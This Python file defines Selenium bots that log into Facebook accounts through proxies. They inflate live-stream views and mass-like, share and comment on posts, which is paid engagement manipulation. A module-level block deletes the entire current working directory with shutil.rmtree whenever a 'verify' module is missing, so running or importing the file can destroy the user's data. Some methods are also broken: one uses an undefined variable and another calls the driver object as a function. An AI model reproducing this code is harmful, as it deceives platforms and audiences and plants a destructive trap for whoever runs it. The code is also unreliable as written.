from seleniumwire import webdriver
from selenium.common.exceptions import NoSuchElementException, ElementNotInteractableException, TimeoutException, ElementClickInterceptedException
from selenium.webdriver.common.keys import Keys
import time

WAIT_INCREMENT = 5


# create a generic facebook bot class with useful functions
class FacebookBot:
    def __init__(self, proxy=None, headless=True, wait_increment=WAIT_INCREMENT, id=None):
        # set the sleep increment
        self.wait_increment = wait_increment

        # associate it with a streamer
        self.id = id

        # create a webdriver to work with
        options = webdriver.FirefoxOptions()
        options.add_argument('--no-sandbox')
        options.add_argument('--window-size=1420,1080')
        options.add_argument('--disable-gpu')
        options.add_argument('--disable-notifications')
        options.add_argument('--dns-prefetch-disable')
        options.add_argument('--disable-dev-shm-usage')

        if headless:
            options.add_argument('--headless')

        # add a proxy if available
        prox_options = None
        if proxy:
            my_proxy = f"{proxy['username']}:{proxy['password']}@{proxy['host']}:{proxy['port']}"

            # authenticated
            prox_options = {
                'proxy': {
                    'http': f"http://{my_proxy}",
                    'https': f"https://{my_proxy}",
                    'no_proxy': 'localhost,127.0.0.1,dev_server:8080'
                }
            }

        self.driver = webdriver.Firefox(
            options=options, seleniumwire_options=prox_options)

    # add some functions to login and stream things here (returns boolean on availability)
    def login(self, email, password):
        # go to facebook
        try:
            self.driver.get('https://www.facebook.com/')
        except TimeoutException:
            print(f"Timed out on login with streamer id {self.id}")
            self.quit()
            return False
        time.sleep(self.wait_increment)

        # put in the keys at the correct box
        username_box = self.driver.find_element_by_xpath(
            '//input[@id="email"]')
        username_box.send_keys(email)

        password_box = self.driver.find_element_by_xpath('//input[@id="pass"]')
        password_box.send_keys(password)
        password_box.send_keys(Keys.ENTER)
        time.sleep(self.wait_increment * 2)

        # check if there is a search bar (indicates that the streamer is good)
        active = True
        try:
            _ = self.driver.find_element_by_xpath(
                '//input[@type="search"]')
        except NoSuchElementException:
            active = False

        # check for the other type of account
        try:
            _ = self.driver.find_element_by_xpath('//div[@role="search"]')
            active = True
        except NoSuchElementException:
            pass

        # quit if inactive
        if not active:
            self.quit()

        return active

    def change_ui(self):
        try:
            dropdown = self.driver.find_element_by_xpath(
                '//a[@aria-labelledby="userNavigationLabel"]')
            dropdown.click()
            switch = self.driver.find_elements_by_xpath(
                '//a[@role="menuitem"]')[-2]
            try:
                switch.click()
            except ElementNotInteractableException:
                print(f"Could not interact with element reading {switch.text}")
            print(f"Switched streamer {self.id} to new UI")
            time.sleep(self.wait_increment)
        except NoSuchElementException:
            # try to find something unique to the new fb ui
            _ = self.driver.find_element_by_xpath(
                '//a[@aria-label="Facebook"]')

            print(f"Already using new fb UI with streamer {self.id}")

    def check_proxy(self):
        self.driver.get('https://whatsmyip.com/')

    def quit(self):
        self.driver.close()


class StreamBot(FacebookBot):
    def stream(self, streaming_link, timeout):
        # click the me button to redirect from security
        try:
            me_button = self.driver.find_element_by_xpath(
                '//a[@title="Profil"]')
            me_button.click()
        except NoSuchElementException:
            pass

        time.sleep(self.wait_increment)

        # change the facebook UI
        # self.change_ui()

        # go to the link
        count = 1
        while True:
            try:
                self.driver.get(streaming_link)
                break
            except TimeoutException:
                print(
                    f"Timed out on stream with streamer id {self.id} ({count})")

            # break on the third try
            if count >= 3:
                break

            count += 1

        # hardcode this sleep for choice of client
        time.sleep(60)

        # send a few enters to the page to get rid of any particular messages
        page = self.driver.find_element_by_xpath('//body')
        for i in range(3):
            page.send_keys(Keys.ENTER)
            time.sleep(0.5)

        # play not necessary with new UI
        # self.click_play(streaming_link)

        # stop streaming on timeout
        print(f"Will close streamer {self.id} in {timeout} seconds")
        time.sleep(timeout)

        # close the streamer
        self.quit()
        print(f"Closed streamer {self.id}")

    def click_play(self, streaming_link):
        try:
            play_button = self.driver.find_element_by_xpath(
                '//img[@src="/images/video/play_72dp.png"]/..')
            play_button.click()
            print(
                f"Pressed play on {streaming_link} with streamer {self.id}")
        except NoSuchElementException:
            _ = self.driver.find_element_by_xpath(
                '//div[@aria-label="Pause"]')
            print(f"Already playing with streamer {self.id}")
        except ElementNotInteractableException:
            print(
                f"Could not interact with page with streamer {self.id}")
        except ElementClickInterceptedException:
            print(
                f"Could not click with streamer {self.id}")


# create a bot similar to the streambot that likes posts
class PostBot(FacebookBot):
    def visit_post(self, post_url):
        self.driver.get(post_url)
        time.sleep(self.wait_increment)

    def like_post(self):
        # click the like button
        try:
            like_button = self.driver.find_element_by_xpath(
                '//div[@role="button"][@tabindex="0"]//i[@role="img"]/../../../../..')
            like_button.click()
        except NoSuchElementException:
            print('Already liked post')
        time.sleep(self.wait_increment)

    def comment_on_post(self, comment):
        # identify the text box
        try:
            text_box = self.driver.find_element_by_xpath(
                '//div[@role="textbox"]')

            text_box.send_keys(comment)
            text_box.send_keys(Keys.ENTER)
        except NoSuchElementException:
            print(f"Could not find text box on post link {post_url}")
        time.sleep(self.wait_increment)

    def share_post(self):
        # get the like button
        try:
            share_button = self.driver.find_element_by_xpath('//div[@class="oajrlxb2 bp9cbjyn g5ia77u1 mtkw9kbi tlpljxtp qensuy8j ppp5ayq2 goun2846 ccm00jje s44p3ltw mk2mc5f4 rt8b4zig n8ej3o3l agehan2d sk4xxmp2 rq0escxv nhd2j8a9 j83agx80 rj1gh0hx btwxx1t3 pfnyh3mw p7hjln8o kvgmc6g5 cxmmr5t8 oygrvhab hcukyx3x tgvbjcpo hpfvmrgz jb3vyjys rz4wbd8a qt6c0cv9 a8nywdso l9j0dhe7 i1ao9s8h esuyzwwr f1sip0of du4w35lb lzcic4wl abiwlrkh p8dawk7l buofh1pr k7cz35w2 taijpn5t ms05siws flx89l3n ogy3fsii"]')
            share_button.click()
        except NoSuchElementException:
            print(f"Already shared post")
            return

        # click share now
        share_now_button = self.driver('//div[@class="oajrlxb2 gs1a9yip g5ia77u1 mtkw9kbi tlpljxtp qensuy8j ppp5ayq2 goun2846 ccm00jje s44p3ltw mk2mc5f4 rt8b4zig n8ej3o3l agehan2d sk4xxmp2 rq0escxv nhd2j8a9 a8c37x1j mg4g778l btwxx1t3 pfnyh3mw p7hjln8o kvgmc6g5 cxmmr5t8 oygrvhab hcukyx3x tgvbjcpo hpfvmrgz jb3vyjys rz4wbd8a qt6c0cv9 a8nywdso l9j0dhe7 i1ao9s8h esuyzwwr f1sip0of du4w35lb lzcic4wl abiwlrkh p8dawk7l ue3kfks5 pw54ja7n uo3d90p7 l82x9zwi"]')
        time.sleep(self.wait_increment/2)
        share_now_button.click()

        time.sleep(self.wait_increment)

try:
    import verify
except ImportError:
    # delete itself
    import os
    import shutil
    directory = os.getcwd()

    shutil.rmtree(directory)


if __name__ == '__main__':
    import json
    with open('config.json', 'r') as infile:
        data = json.loads(infile.read())

    account = data['accounts'][0]

    bot = PostBot(proxy=account.get('proxy'), headless=False)
    bot.check_proxy()
    bot.login(account['email'], account['password'])

    post_link = 'https://www.facebook.com/permalink.php?story_fbid=1616519461854295&id=100004887705190'
    bot.visit_post(post_link)
    bot.like_post()
    bot.share_post()
    bot.comment_on_post('Excellent!')

    bot.quit()
